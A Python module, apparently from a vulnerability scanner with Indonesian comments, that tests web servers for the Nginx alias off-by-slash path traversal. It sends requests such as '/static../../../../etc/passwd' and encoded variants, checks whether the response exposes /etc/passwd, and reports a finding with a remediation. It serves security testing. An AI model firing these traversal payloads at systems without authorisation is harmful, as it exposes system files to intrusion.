"""Nginx alias off-by-slash path traversal.

Konfigurasi `location /static { alias /var/www/static; }` (tanpa trailing
slash di alias) memungkinkan request `/static../etc/passwd` keluar dari
folder static.

Auto-validation: cari path static umum di response homepage; lalu coba
trick `/<path>../etc/passwd` dan `/<path>%2e%2e/etc/passwd`. Bila body
memuat `root:x:0:0:` -> vulnerable.
"""
from __future__ import annotations

import re
from urllib.parse import urljoin

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig

STATIC_HINTS_RE = re.compile(
    r'(?:href|src|action)\s*=\s*["\']'
    r'(/(?:static|assets|public|files|uploads|images|img|css|js|media)[^"\']*)["\']',
    re.I,
)
COMMON_STATIC = ["/static", "/assets", "/public", "/files",
                 "/uploads", "/images", "/img", "/css", "/js", "/media"]
SIGNATURE = "root:x:0:0:"


def _is_nginx(headers: dict) -> bool:
    return "nginx" in (headers.get("Server") or "").lower()


def _candidates_from_html(text: str) -> list[str]:
    out = set()
    for m in STATIC_HINTS_RE.finditer(text or ""):
        path = m.group(1).split("?", 1)[0].split("#", 1)[0]
        # Ambil top-level segment saja
        seg = "/" + path.lstrip("/").split("/", 1)[0]
        out.add(seg)
    return sorted(out)


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        home = client.get(target.base_url)
        if home is None:
            return findings
        if not _is_nginx(dict(home.headers)):
            return findings
        cands = _candidates_from_html(home.text or "")
        if not cands:
            cands = COMMON_STATIC

        for seg in cands:
            # variasi payload
            for payload in (
                seg + "../../../../etc/passwd",
                seg + "../../../../../../etc/passwd",
                seg + "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                seg + "..%2f..%2f..%2fetc/passwd",
            ):
                url = urljoin(target.origin + "/", payload.lstrip("/"))
                # Penting: jangan auto-canonicalize URL — pakai raw path
                r = client.get(url, allow_redirects=False)
                if r is None:
                    continue
                body = r.text or ""
                if r.status_code == 200 and SIGNATURE in body:
                    findings.append(Finding(
                        module="nginx_off_by_slash",
                        title=f"Nginx alias off-by-slash path traversal di `{seg}`",
                        severity=Severity.CRITICAL,
                        description=(
                            f"Permintaan `{payload}` membaca file di luar "
                            "directory static. Konfigurasi alias Nginx "
                            "kehilangan trailing slash sehingga request "
                            f"`{seg}..` keluar 1 folder dan path traversal "
                            "berfungsi normal."
                        ),
                        target=url,
                        urls=[url],
                        evidence=f"GET {url} -> 200; body memuat '{SIGNATURE}'",
                        cwe="CWE-22",
                        confidence="confirmed",
                        remediation=(
                            f"Perbaiki nginx config: pastikan `alias` "
                            f"berakhir dengan slash (`alias /var/www{seg}/;`) "
                            f"DAN `location {seg}/ {{...}}` (slash di kedua "
                            "sisi). Atau pakai `root` directive yang tidak "
                            "memiliki bug ini."
                        ),
                        references=[
                            "https://i.blackhat.com/USA-18/Wednesday/us-18-Orange-Tsai-Breaking-Parser-Logic.pdf",
                        ],
                    ))
                    return findings
    finally:
        client.close()
    return findings
